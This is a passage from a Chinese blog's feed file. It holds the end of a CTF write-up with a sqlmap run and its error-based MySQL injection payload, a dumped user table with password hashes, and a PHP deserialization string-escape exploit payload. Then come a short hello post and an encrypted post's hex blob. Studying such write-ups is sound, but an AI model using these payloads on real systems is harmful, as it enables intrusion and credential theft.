sqlmap.py -r 1.txt</code></pre>出结果<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:</code></pre><hr /><pre><code>Parameter: #1* ((custom) POST)Type: error-basedTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</code></pre><h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5><hr /><pre><code> [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL >= 5.0</code></pre>ok，直接全扒下来<code>--dump</code><pre><code>Database: noteTable: users[2 entries]+----+----------------------------------+----------+| id | passwd                           | username |+----+----------------------------------+----------+| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     || 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |+----+----------------------------------+----------+</code></pre><h3>最终</h3><h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>问题解决：n1book{bG9naW5fc3FsaV9pc19uaWNl}<h5>小结</h5>善用Sqlmap，能跑出来的不多了...<hr /><h2>Unserialize++</h2><h3>反序列化字符串逃逸</h3>guest.php先上payload打到admin，字符串逃逸成功<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4><h3>index.php中</h3><pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));</code></pre>而<pre><code>function put($data)&#123;$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);return $data;&#125;</code></pre>每6个u换三个字符，使得name盖过pass的字符并"闭合，然后反序列化就会读取我们准备的字符，即从<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;'</code></pre>的分号开始<p>本地./caches/下的内容</p><pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre><p>即后get</p><pre><code>function get($data)&#123;$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);return $data;&#125;</code></pre><p>会读取</p><pre><code>"O:7:\"someone\":3:&#123;s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;&#125;\";s:8:\"\\u0000*\\u0000admin\";i:0;&#125;"</code></pre><p>忽略不可见字符后<br>读取到其中</p><pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA [your_pass:protected] => AA  [admin:protected] => 1</code></pre><p>然而本题和admin<strong>没有</strong>任何关系</p><h3>构造</h3><pre><code>O:6:"level1":1:&#123;s:8:"username";O:6:"level2":1:&#123;s:8:"username";O:6:"level3":1:&#123;s:8:"username";s:5:"admin";&#125;&#125;&#125;</code></pre>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}<hr />check不允许匹配到"username"字符串<p>于是准备绕过<br>类型的字符S使用大写<br>u=\75</p><hr />level2中有__wakeup()方法，于是绕过<pre><code>O:6:"level2":2</code></pre>例如本题，<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>我们有u x60，最后换成字符30个，于是反序列化会继续向下读取<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |（到此为止）</code></pre>然后"正常闭合，这样接下来就会读取我们构造的字符串，字符串成功逃逸<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;|（到此为止）</code></pre>下面无用了，因为}正常闭合，反序列化结束<pre><code>";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>以上是admin的方法，取flag原理方法同上<h3>最终</h3>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}<p>再访问./guest.php解决</p><p>问题解决：s3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}</p><h5>小结：</h5>字符串逃逸字符个数<strong>一定</strong>要算好！（吐血]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="article/Hello%20World/"/>
      <url>article/Hello%20World/</url>
      
        <content type="html"><![CDATA[<p>hello</p><a id="more"></a><p>这是新建静态博客的第一篇文章、</p><p>这已经是第三次搭博客了…</p><p>马上搬运原文章来，记得做好备份QAQ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux大作业</title>
      <link href="article/linuxprogramme/"/>
      <url>article/linuxprogramme/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，别想骗窝." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="edac3b509459ea1dde7ac6095ed87608f52380468230b537be259dc1e243314a">acff4705a538ab3d2e8d1867fa2b50da9a1640994d2649191c3b0d2882ea059e078ce3184479436ba540ea736eea00a26ef0d47536e6a8ba1ece4fa00d4edfc233661a1f5b528136d53602d2b07301d71f9695a477a81791e35a9631c780471f95636cfb7c7f5d180e87d9cef50eb4b3afcdf001a7287781e75f53d874dd9a0ca14e0adddc31ce467c7be83e0843852f8421c474f4c5de7884b597b0e487425b41418cff874e2ca0a866f126a5de413d7686e873a02252fe36c9f1de918d5dc896495e77e9e89cb6d0cb088f4856a1b26b7f5fba80658a7e15e37b88b8cda3d2c10b2e3a80e10394a039bbcb9931a0f1052cd5c61dc3a1b91121f30c845e7982e3b9b9f0828110d12c890abbf41ea668d6633d287da4b6dbd82bcfd4a0b07f3d7f309e7437a25620f053ec592429cfcbdad93bc1834f0755d473406bb0e8184355aa4a409aaccf4961beb53c95dc028ca5daebc34234adbaa196f170b42393c16c9023c2f73a19075730a5001f998c672f7012bda6d0e789a316f518b7fd7ffa4a4e9137b1ac6fb352c0918911d4e4b4ff76ba5e29cf94fc83d5917efc324551d5bcc6237ace3c0b83f356a21be7c65be829f2b574b17ffdf2530e8791bb53620a48f74dc1f49db207df13884ee455b851108887f3a4810fc8d97c7ee09dc5f366b1231b82806481ddec1a619d4a1b00d7e9bd28562fee938979df69cfb2f5334131abbd0d2c3c0d756a3d85569b888dc071c9b4ede3204bb89fb692a153007f9cbf810125262ad3c6ca841f79b5687942ce6eefa4764160a97ad780e5fa46c1bac50daa539e1be4e423cba2c541324b32db0a611e97edce81229ec32bd6d80f5c891ce38021dd2fdd8fc94da6ec51942373bd3d45141b911afae3ff4132b7c2406e9ab7df8dae4d0924dc8c62af70d963a70f97688ca94cbe5998ddbccc2ce5c4729ac858a95a8367f1d126f7c4471c0ef679434a182fe9937b169cc31a676db877360be8551f818f74c53354af1bf2631f729f6d29d12e85ad12fe2c4fba2252a8e767cea338734c14adbce72e7661ab303459ca70ecd1adb7c611fdc831929569fd7d63ae9fbf7e70a43423965c4f18d29eb62b7a7e961cd55c2da242be67a88caa85b0dab5cd4efde5c47d68b9fdd5d118196f631276d17f4c34289a0d536269c6b96a6254fd43dcb98e787ffd4cd3e1fca0e72296e32c2ccb1a2165a3a6600eb6b6b161ea5ba5f22bbda0bb18283099a3ace86a35e440e1c8b096e98fe946654e2c9712a8a43c4563514a687709620f6f4cf2e49391f77d7fabb2382b0faf4d5b61038d6309fafb69dcaa6c147b5d3dcf6861b543af9298fc2da1903f91abf9c1a097dfc63344013ecf03b37a25726306457fef03ae1e436cc12c541fe34cb84619fc01e8e9ef8948b596fa60b3fc6d1e6d28f2b2f38a3e1281a12358a9ddf9a833a9218cbe8f46c7d2b253b48cd1c7c8404de4648782022988c2e808449db8d6fdec878c3723260fa1d6a4a90cc3335c513871fed4b7b1718e3fdb0601c64d79feb1ac04dff610b34a2fdd66243e67a353c05fcfffcd03df576a61dd839fc98cfb0df8fc67673d5f69cdfdab4e9b31d020118d97922faae6a51a95cfe2afa6f765e9175ae2694e488257dd2cc652442eacfafd024002afd2040769d5d18111aacc2bd1c94734bd35442a3fe20fc29ea3333d21ee93092947f2ffc3aefa9b6ac1ceb7cd097bc103c5e48dba22e31b43fba336cd6b2fe92160333daf669eef6c36f4f6b1485e6d2214fcd6bfbd0aa34930207fbed4da4f09b32438d7cd6a8c855f4d618f52d1e421bc98346ddb06b34b771571d4f2c769d6929d6f5387a15d750e20d1f23de4f86b386c3e5c956026404a95ce972542f9cd8e1036325c256707786a2b5dc6eed112fd5156652d65c0f05a99dd97a824d7d0a8d51256e91c364c5b1f9fd2583710efce180b623ff25a32daf2bbac7fbc649f01ebc1422ca1df2da55db9cc12994137c702dec09d103f414e232f7f0d66556680918e95dbaa6ce04f88b428c13a42b718d3668abdbe824a40314f23b17ae1b6f0297049bd04706b55277683876d08e3a7c9f0f0ea6079534d47b852c3a23795f87fe9b53df18774dbdb2daca31ae1bf6fb8174e5ac3beb81f0b016602c3bcf6eef2febfae8d83e42c563aaac1075c9930af993f6f936dbaf872c9b532e8752027b5ea7f9db5a981b29007801a4a964c18364508413712833ba60f5f0492bc756ad3995c61218392a83adf4816c331688c7327c56e7e8c6f9a14d09f188fadeb1b17cf243fc7ef9344ba0ca4c61243e9cfa4a86d0574c26c9a7bfa7936c1cf2db64d3951ff96c84b1f8ffe78128e44f7ef6224ed350640ad2abd0c454bcd695a699d525db879e48bda0a810d8c3ca07dcc13416a444d1cbc63ea84380a3baa50920086a4e683f1b176eb11068927fe6c6d9a882db18a3947c8f01a01416e880513ef0ffa514a838669c847188079d043b05aea244f67534dfc5ecb612a524029812f8a2b57d5fd6c06e953e0875ecc7821e2cfb53fe7b72474500ed09c1075c55b504018d4cfb58e904441106e6ec21dbb707a7cefd1b67062b348c7975756ec801a47824ad824f64fe31bb55cbe464f07422d307215737720f9333d5c7b2e21385d6c2d6aecca355d4b7b3e93f620d6ff05c6641958c1e52c84a229d3738d58f0f7bba165817b7378950cd66a06f0233d54d412465b9806ee0c55f659bff10743a27207951ccf8d6df5d64ebbb1b662899839de43e2eae5414b76b3da826b8a07c3a37bb7436b78ec9063cd0af4e0dd8516e04c434bf600ffa2aa8f63b3a44c26d9a7c0ff4acc243a128b0f43c997bfa67e998150385bff596a74ccf32d54288440074652e152e1461c5a8043742bd3eb87a314fe472dc4443b1df57e60571df610a8cfed34dfee70b65979d5cd22440d9933649cde823fbae75e825ff6749cf676970e4ed388c773f783b30d005f9e05eebb371b3f34cbcdfe9a4c07bfe725434ccd08fb2b24335e912f016a740a5fd23b34aceca452e575943d4ede1e8bcae11dc78be792446a3566e9f23b8cc130448976e8f694855b37df9e2be4fb48c9d09b550044c8bb5cf06c36b2e69a69985daa13e074d88ff8c776226c864d31908e7e4b651e35848769d1dc4c78616ae7dc3ab7c9110dff3dae21235a81e5ada8cf4f0f6ffb54b2b247a2cde985f612afdc3315b29930f9ae43d82e6ab49e3113e18ee96b995a89a9f331d00b4ecdf1aca700b657a1740487efc9c1c4a650b3ee012519867566684756aa930eef69755ec0bf1ed379a6cd5b0262401349ee5c52adf0aa594049a4773a540b5073d2512a1f8f7f8c1dfaaef0d7fe16ddb22157c51a7056d6557174583130361e43c6046b907fd6946a59bbc9728512db2fcd8cfdef85d86a36ea7b2c61ef96f3d82efed5093cff91616554599f7a3e4cd1beca9e53f3fa927aeb706bead053f1f9718c884d4c75432cd6f6266f0f9e3cc613fa446cd97450481e7032eccfcd779f9c7a1345033d079b91db0092576d7b718d5290500d6434cfe0e3c672bb6fe7b4c9afec9481d4bec24dcd5fdc2e9ecb2a8534f62d28de4b454d3edeba78da4f0fee951b7fd6b081945cf05c58982c6127e6744c2dbfa49cf9ed3e0a80b216b9a0404b13ca6e41259df52b533b6f346ed273e3c182c94afc2b087bb1a99c7935670d16c845f952179046624b614b575e96c018ae63141879a8125d17404732bbebbc65e4d088457848d4913d3752c2149539b005b9a96543dc4cd7277e44fabac62f22b0b09341775194cf291bc336182a48438a2f0c333f4937df53dee70d674a3bd46164f3520296d93485a04f3eb9324eeb7bedbdcabf1657e535ff0ecd6e7bddb99ba5b37869ec7f9668e60520477d17fcaab89fc813081fe004a9ae30a8ed3e07a90330dc642f5b7a6ad7f68d43289a6cfd8b5a8176b1f4aba5d178a6a389d60f84a34d700d5f09ea106886c58ee2e0bdb392fbb64fda5557b2dc4300d614b7049332242f44de4cc2bc393d289e038ec9e560f467e606648775f11eb428864a05c3f19e49c8ae09bbe41af91efbafd0efa519b74874d4402134803b4e8af62094d06249d2fa0d85ef0c0ff46b5fd4d479105f75b4cd432b3d5fe6995de472397d46e9dc72506aab08b294b2c0ac53b5f862b66fafc6504b52567a781d69c239a5cbce6be5906b38922221db93a37de4983120a09c34fa10a3a555ed9a9223a989597ea1c9b5821b7573a6454d42d2ff348221dbe9787bf524ee4f2e7a8b09d7a4d485d79ae808522b99d3492436613317901b3f8d9c2150fd59de449ad97248fdfa75c2a802e43185eafbcb84d0aa6a44501c78c02d2bcbdf869772de0b3c05f025dcfb321fb18126fd31b08318a3078395ba41e9af78dfed47d6b77f545e33f278d56bc12f85731d64345025c6495d222d6066b47a255743dda801a8b9329e2969a5a65f515f66a8b77590192f38a10895ed28c7187cbbf0a2a3090a4d4618fb5bee332200d51e4db1710fe082df190dfe2a016e5a53b021dbe4a858e10ac293cf7acaff4b016288fc35d7593eccc131f71c42c449965db55ce498a7829323b897ec08bcbb043400589a1f9e0bcf57011aed9fd5682fef4641b36b691ee582016ddb5405e401f40a8bdc7ad9e7c12e0e96482fcff0ca6ef181f0f39410e563071182e7f5b64ada134c786a42d4c91388633eb23564ae494e90eb3d9d87aa55de2b8d0a9820df169a0e735e4bc5b9c63cd917c2348b18165993f4537d591d1af65619bc28a5e94267b810c1539764ed6713ce0908986066560566a8101f271ef9db243af34e157ec58ea57d3c93d3118bbcd04071d2146b2d7387b34206fea5be8c01754601ff2019ce2a074f281fc55f96474f294bdabf872914969e6b885c77e1b8a1704166ad0ed33f1ace6b0d6c1b06e4f4ec6e57bc3c7688fe7735c7cf11764a2ba14286f9569480456b719495ea8dd25358b5a1fce9bb9c0dd3939d52da4d0e07f6b71499617156e59c8a3d50c0c94620d0f24991cdcfdb93e6e92c43068f329c1d040312d9471fbae248dfe43ada246618d8ae95a11bcc8c2232b478db891d7787cf4b5fcffd8051324c9068e360153b0063862b661678ef57d3b2396251aeddfbdb22793bc7a90b022de655ccf5adbe1692c639d0326aafe52caa092017d3f14ed81f2ccea47b757f3c8caaaf2e4e32c8f727f6041e16743783a8f8dc67858c7987a39ed3d5e77722db3175294cb1559098f7475d1f6f54124625b567197a195060dae9107e572a8772d157435193ac2d0c7f1a3167b33cd396148accbb8437ca85d17d4b179abcf5a74f027492f07a5f62e08af188b3c93e0f5fafbe75b7f448638fee8a1a21bee64990955ce0c5d1bfbf9b267e10d9de3dc61a71a20e74bdd1b468d533456b0d0cd1326aea671ce89acff8e842e723022fb328aadc81368ffa371f0a51179c4c04e0d0e4704e48cc938e3c951247f8009662b8e1d94b63c624dfc7c9760f7dd38acf1deb71042155abef6a4fc43e49addb446b71337f9a90adc1d5ae084ad02a7144dd6565f95aaa2bbbd69a97f511143ba4e92867953483dcb98487b020f7baef8547feddf7715b2904d3cb76a90a12ecad7a8d3ea75931bad867cceaec0fc44726befd4dac146f9615c875e8eaaa0a66fb8f59dc98af8189167f9adfadab92812c04d4c862c5d05a4600fbf2ca70974bfa2a312cc8aabce6d215c0e2e15471b1abc6766631b97809b3751b72b6a06c2d630522d8caab98792ba61e4229d90a012f1283f1bd7c54bc02b5675fa08e67771f516b61f3fff32014ec51beecc0005a4e6e5ef88e8180a0fdf0cd6d16bace7dda36653c7bfbd03ce84f5dbd9794433d6ca5809a08d6172ec6d6c5e8e2052f35aa0f4b6d537ff1b5ff15871df5cec72dc3b4210e92841655d79800ccc7e3e038cb2434c59b9557b248b49b5512af88e14499f3fb537b5672a24eb48cc81bc66ac7387f96ff791d8ebd734947c3a274b3b1cf244ed67a5d4a8f210f1ddafbce505267df0f5825e8b9d1883a7275fe11e0826c8ec974d30ab40cb0fb8dae002960acdfd8dc605a1553d3f56c246cee1354656c7c4fe5f691490f4212b31b574abf9c10a38985c3668cf8793822e9b9c9b18b7a776fdecc647727f92ec3a01d303c707137b934e2d7291c62f3e7704d6bb5a0924b96be751e6aa653b0058c03dfc275aa2ced7e58dd84cde7c8f9359916697ce7b39d80da43257824794d5031c53b2f5409b2b070b09c82adbacbe6172148863c30dfd4412b6491de925af2dc6c9c0ed706ff09e00e0314951d20696c53d3446ec95263a6aaf81556c180f4f73a85fe853e858d2f9e5c12ceb5b12127cff9d0d81a72e8eebbde5cdf8f8f62459cec8304d699f0846ac77ecc38f337528121df2829cc185f319c1681681ab1efa9b88ed83b6f3a32b0f828a5d381eb80f00017c4b6ebc85aa95e8147e9775da0b8a63fac9dc2283e6fc1f9b7fe73c0c4494b0d77417c7704824c2c6459dc631feca805bf974fe3490d58524eb9a1e4844bdf580502f61289726184ab77baf1be3a6af512cf850f3261f77cf8e91d8585a67315aec8e338fc5126e36bdf48475946dffa31b2eafda49dc947cad591c69a76c06f91f7d4973b04e62d6f5017ad549561e42b1f6faab5291632ece2e00f1d79e083452c694a7df5c8652da40a0b7d5dd086d97ed9af4455ab68573b79edc2806040696f337233d70343f648903ccfea390573fc4715bb40ef82020d064c3ccc07d0f3930e45da672f4447886234929ba9f884b3c4fccbefc1e567983e038d06414186d1a46932ec8e2848a1e5855b271cdb9d4d2e47b50f739db195eb1d8e2cd12068910a2ef9e940f4a1630b620159a1b59d84c95ce06719c59cc948a84be7a4247eb35f7ed0ba1ed2acda4cf1fb424e4b4582ba59affec6f1c1ca879cb27b1a228649d6e4c3d7df6f2101665e2c2499f3c6cb7d4c62d676e0ed8aae4cee2b981d3e09dd995b5ca6b051104ff0db5d051351c864014459081daf8a99d201267f44cc25832da01665659a3e2d2602efdc419db81fb5fba0c514dca5d32d8d2d94b51b459541f9eba18789aa4f7aa6c14a65aa753405531ce7891398ef7b4bd2efc3db5feb1bfc7c5cdb482a9d56dea4840ec5e9398e2b0dce10021588659c5ea057b99a5de82279b9122461a09bef089f5bcc86a28704afa04528fd0728d3508a09c2e4574a4f5065d66f34a73c91b33853eb904cd9d529393008da406a8e341caf0df4aa4834b7c6ebb5d11a2e2ce01238ba6a13960c6f680a6dd08c0b7ed51830c0bab5d12976602bec57a11172e45bd1df0040d4f968e9c9be8e1ee0202f1577f604d0b95ecbcd8eb49b5c7a17c6c74c0606f5d7ad0da9cfd11f04700e9db9c91b86afb2f71c4d04290b5c894574d53665f2c613db33844ea90142ee05676e10a6a35c9fecbf66b4e3ba059d5fc2aec1b6133e72cfc10e16307fde4f5efdeecdc3947089dea83211f607e0c62649a2a2990475cd8c4f06754e4f0cd7040ccd7dd144926c77f810dde2db4a8212443ce7cf5648679f2413ec68b89bc34ffeeef8911f67debbfb60998ec224059e305bb820a0b1ce1416af9e68c14ee3726804c992cb49247619dea9d5c23486f11a88fc2597569e947a1077b2624bc1c4a5644ccaaba55b2dd4a710d7d3316726eec407c50ffa66b8eb9ececef0c54134585141a7e96419a1d5ea97ea8c7478f4cbd84f01456fa508dd019856858fa1583522518f7322d35ee4b4132d5b584f6ce2ab77d0bad8e84f8ec6bd83a96b4c39a90026d744b443b35397a69947b0bda86fac7f2896037804357fa1672cce1dc5855ce5ea6b51d32cca3b17d03d9cf66830269d031e92032904956624400cbd78b61ce0634a456e2440f763c0caa4a89bbfea54ba6f8f51d1185f093491dbbbefd42b1d1b43140275d097851d5a7a671246cfdabdfdfad8efc064eca6f4ccd0121be68e22e560b55f114e371ee199d689709d89031062a065ad08bb14f7ad9f683dfbef968594cd548a6f0ba79a7407f7e2fd987abaf11c07c315db10998c8f7cd466fddb88fd4f8c1b98f4b371aa50e891e18f699168ecfa76e7bb84946b3c9fa471d427ee24d8a3b0acd3474b76e453c3434568f8c6c7cb97124756a835a0a6db14269b21d666bc5867885d03a74ab9a1425dde712eb600fff24d7110c46fd7ceb56b16576933b24758260318017935902555b318e8d14f3f64c9d014a2aaf0d36a9a08f118b22e5b71b66559ec21bd2df7fae0808ff9f414a65dcf35ef21ed3ef3be74fd192f021aae858cae1257119d3b2f7c373e011ec24f0e9c1517cf25acd211b2606a0633055f1fc686b8cac0ca014becf72cf47b7028d2bbc37a83b0ea0bb4cf48811b567a0af6d43858e3ed573bc4e8ad43713e57315840ff5f611b3d6ebf4952a2e708cc22ceee17fce368707ac9fda3cde6017f9a7c7809520b62cd4ee6158eb142299da192cabcd6e29a823b9f31d988fffafd54373e3dce6bb7e61ce6f9e409320342014e2afa0f92231cb2cb22a1994f7e9caa287880959f5d72514c1d7a196c9dd7580649755ab4fa037d73a57ca2c41cbdf6210120b3720c380c272db880fce084e9a63c222ba06e652bd5f943f97564fed3b397968ab43237bbae1521976fa2dc7db591f9b97a8f54aeb5f5668ad63958b8b4ac4fc4b6153e4b81bedb0045ff509f4e601011af8b6e3069deddb7bff3c7a93e5c59229677f5c14e3bc4503394a4f8e906fac0f6b9cde23bbfd2f324ca785052c8bac0389b92f1361b8fc3776e6296c5291a9eaf975470ebe184a6b8bd47d53ee68b367c6f3fc9c378ffdf42452d8c8de046193fd881de5750670d4f4f05aa87dec913ca46d4e496a2a2dae7056397d38023b3f9ee40f815da420aa292bf8ae2259691340ad98d6a1c871ca47709cd64656f25c2396059b2b672f125a149c981b0fcf96a3dcf037bc4cdb5407286b7b51b56d24a981c45d58d9b89db4d0909a07b199b6989adb78f95d1b8507744d07c8cb60ca224ba7553164e3e149d58c53dd1a2aeb5b865238cddd14d8c7d77e5115c8f583d9fe76c8bbaa9a4d5c47cfea418c334ad9c87f5962c562aaa7baf0e9f761b24b377c6be58a8b4b298da9a036b788b786a4d0007c17828aa39d3b8f1f7536e420e24a31a8a156e4a960e8c59d55f7c55d6cb410453e703bfb3b1e0085b896a67f779bbaaee766238c29eba029620f5c8e1291e7901ed4fd129bae954916ad799b21902bfbe4e1c9e9f6a1c7800a68896d11668dc5ce2b3f5b0f21564ee47a40d3f8b3427c0de4aeec308ebd33c3f12d45a7ce771f0ac8f5c10fa63cfc178dd096f50bd6003681c21eaf6b4f70504d9957bef4ffe1a08ed9a84d6a63e51a9d7c7a7c80d9f3ee85e3f35f6b27e6e878aef8fd23390c8caf8ebfc665b0fb62464c9eb3582d248d85b7ad7ca649b3a9ee8e6bf323da8a1f31863edf42575f0bef6a5dbad00df96011df82c75ef1ee52dfbd5906d99ecbfeef486cb4a7d55ec3dc34d7c60794474845836d712f5f910eed9cefa0d7bc3371777a4400206fa5f036aae039e6cb22e3caa40628d310d9cf3f363d9dd2d7373828a5c8e73be2869f09f5fb956e3c5041c33a5c3b810db4e0504751b67ace7a01376eb848265f2cccbea47d5f5cbafc39bbc46caf683c945960d7db65c0fe9b194244d305ed2a73fd3c7a0e4c2f8daacd59433b0ebc5a68cc06bc350fa33335bfbb6b125d8cb512773e0b6150e564d6731b42ddc31a2308623418752e978c0371c26a3b247df0edb05f709598ebd8421aa77f44456184f92dc529eea139195cae3b39ae91eaf1032589f51f08fe37936a5f6d30e6e5079e9c0a1fa63c8d50785959a4bff3e53dabb0abee102469024f22ffb5125a9908f28c65594e20f708c264ec6ec62b09d43fea5398425053f94a03cceae97121d63a8bd100410b4b2aaf9179ab47a8df171b2891171699656ba4b6977f6b15ff4f06fa3dceac67115fa323ee0e48d9d8e65a5a3cbb63791cacfb4f3cc92b8c4b8506a0ff1ca4411cef12bffc17203af94ec542ee8df75abeba0bf9fc265832449dddd6c3de3b8154a36670129c5735511f22d4d7679e6c2ff47a8f6675b07ab88101350d1e4944464f2838a78a07ad3a756184fe7fe0668c46e475bd66320b81172bd258fcd8b251ce501c41465730d53e0ffc3285cb9decc8ecb3e932d4993199464cabd5cdaa1c97d1ef0b42d05d78f896aed1c048e3206464ba7ba8e3e48273ecb6002908626ac89891e9006ba01af298a655386d844dd87158f5173a46f09651a32c3e6441e4f00751ade54ff5c75f3dc0e237f3f3ad733fd507455ee8e94fd744deafedd1f69cea57fb99f3a90eb203fa1d3026d700eddf4c2afb4f5f28ca095daf729c218762874c007039dfc2d091637e436b68bddc844666bf8bd6d129676a3be8e7fa197481ab7fc8edf1f9d1a7f18d1e979e723917e51d5ac9e8323a5a6299cac40e1df3dfb70175be5a86fd4d6158e16b4e314d566037397a151814effe8399e98a61302f80c77be877d6c4c626f243a1554adb72780afa09d4b05dc92f2139ac6b155d7c16730a7f4ff803c5ee04f462fe3f174a0e334b4875748030bdc9d137549c5687bee5f027b94df8b4a205fa09c3fd3ada4b36006fd968e59d232ef838e6aa1bf7c36d6ad7c77b6999f018cbd755f0a6c59db6bc1a89849b4ce0e62264fec633bbb5e1e4fe6dd7e041a4c35d989b395e96bbfcb13d70ef292c3070b38b2436f83e8cb2e8bfaa32ef290f1de6eaa65a6a7ecb72c277f49715a1b18b3ba4ed809a031d32ece9e2c77f3ec48f87d7d203cfc4269aa521f36ce7c7b42e855a86fef8e5856bbd50eefa7554adfe3646bff300eecde20c8ca8ea5a0cc640c074c4258d61c7ba5fa775b191d6837af9ea939e748d399a3f2ed0d46448f0eff162b19b722a0c05c05e78e6349893969149e3c0c08c7969ee5f6cedd47386ff947a103f52722d117f15a510d6bda06d193015f46809fc9c1bd0881d803d1450af94ee35db790351e80fa9f1af56dc70c607993577938e121bf2992150c019ce0a5e77cb345fbe5e4713db4002cca71f595b2dd39f7fc707e981df8691e2035d84dbcf2d2623622137896a142ef4f039febc02189ea19f741e796befd5b099abb0736e85907de8f7b55228f48b3cf1de90029ddea3a8d69780e888692a7c6a744dd2577c7dc0bde46444f86c6149e5822143cc8260569489bc5425008342c45c79ffd7b0a533fbffbfc2a02a99a593454c140bc759876b71ad00663c1f2100d899738ae61c7ec7acb5484afc4afeed6bea7ebd1c4de7402594517d9da72b077a2615d82ed8ae808bf108c413b4504d5d9bfaeeccb95ea53d696a92b468809e588625b39ef1ea314b3931fe4b25fd0fb1a8dd23c3eaf4b14c670261368efe4da4a1ca0d3a5e28b2a6d687d812645a5a49bcd364ecd477ec08823e15c9a4e07a875378e2ec47a729929f27f8c06b27548a96c4f1bdfc323bb5b3473e7fa9fce792b9693b45c94f35c756e4a9838ba41d90038f65785d74e98bbc9bbba9987f869fba38227591cb2b3ce347eea590dc7147de68b6d413a9a257c15f51070950a9f2ff86ffd97e6ef3fb3b3483c4a1d81f4124befea4f849a99f60166d88dc17a28b0980598dbcfb330fe3eaee9dad63e42c41aa90851cc806a7ad5f378970727f501da5362870d47956f2158566813417bfdc82c2334cdc55318d90b7cb51b1b398036b6b0275edf90f348a254a559395501ebbe5c6e25c622e6a34f7c8dd83eb35c3a937f03253ee12182220b32921909a840e31614db0fa8f6945b3493dfd7c425064b891480cfe875559dbb844d932fa261c74268eb505f92f76a01d85b49557d98f08d5825be05cab32753d3ff0b45d1f3bab1fa6b1c6b3ef71e063bf8cfb1fc047885049f2a8b3e321a638dff2155f92cda94686e2f19aa977cbf231dea1c72311364cc8dc204fdd4b147a3a639165e7ee97c5c59d5f4a6779e556d0cf4bb5e338f6d3eed83ee32e277dc71d4d2faf72c998115e8c167c9ea9c9cbdaf786d6b1455f017721cedb60b0aa3f6465131ade6124be8db08d52c938a05f48b3076b5c105019a9a7bbed21e17b3ae88d27b8871f4c07eefabacdbb4df4982ab5c948cf829a3c93edefee86d1841c7e255873028f92483cab257b61f300d26119f213c8f5f57015445feecb8c91f7f60cde7ae55f62d1a8316c12986ea08faa8a6841f83466a434a77a2a4df406edaa91442baf887ce3488b0c973361c89e40c1065aecc9eb1bc05eceb242aeb8b3490b0b1d468398b952cfd77e062bf602395392267fdbdbfdf1c150aab21c78d2a90f81cf1b82e2811d9951c18ccbff6903c6d75576f686d429d429ebf1f9f089aa5452dab0767adce508a19124dadb175278b3ccae4cbc2a7a615511575409c9acbc14aa663cf87103f38c5b9f058d89f770978e613b81ce95da343cf7b2f3063cd316e86b99417913f7a761541653f832493bfdf017660d9adcb32823be69